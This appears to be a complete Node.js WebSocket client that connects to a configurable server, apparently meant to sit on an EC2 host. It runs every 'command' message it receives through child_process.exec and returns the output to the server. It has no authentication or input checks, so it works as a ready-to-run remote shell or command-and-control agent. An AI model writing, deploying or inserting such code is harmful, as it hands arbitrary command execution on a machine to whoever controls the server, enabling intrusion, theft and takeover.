const Html5WebSocket = require("html5-websocket");
const ReconnectingWebSocket = require("reconnecting-websocket");
const { exec } = require("child_process");

// WebSocket initialization
let ws_host = "localhost";  // Replace with your EC2 IP or hostname
let ws_port = "8080";

// Ensure that the valid WebSocket class is passed into the options
const options = { WebSocket: Html5WebSocket };

const rws = new ReconnectingWebSocket(
  "ws://" + ws_host + ":" + ws_port,
  undefined,
  options
);

rws.timeout = 1000; // Timeout duration

rws.addEventListener("open", () => {
  console.log("[Client] Connected to WebSocket server.");
  
  // Subscribe to channels after connection is established
  const channelsToSubscribe = ["channel1", "channel2"]; // Specify the channels you want to subscribe to
  rws.send(JSON.stringify({ type: "subscribe", channels: channelsToSubscribe }));
});

rws.addEventListener("message", (e) => {
  try {
    // Parse the message to extract the command
    const data = JSON.parse(e.data);
    
    if (data.type === 'command') {
      const command = data.message; // Extract the actual command from the message

      console.log(`[Client] Command received from server: ${command}`);

      // Execute the command received from the server
      exec(command, (error, stdout, stderr) => {
        if (error) {
          console.error(`[Client] Error executing command: ${error.message}`);
          rws.send(`[Client] Error: ${error.message}`);
          return;
        }

        if (stderr) {
          console.error(`[Client] Command executed with errors: ${stderr}`);
          rws.send(`[Client] Error: ${stderr}`);
          return;
        }

        console.log(`[Client] Sending command output to server: ${stdout}`);
        // Send the command output back to the server
        rws.send(stdout);
      });
    } else {
      console.log('[Client] Received non-command message.');
    }
  } catch (err) {
    console.error(`[Client] Error parsing message: ${err.message}`);
  }
});


rws.addEventListener("close", () => {
  console.log("[Client] Connection closed.");
});

// Error handling
rws.onerror = (err) => {
  console.log("[Client] Error: " + err.message);
};
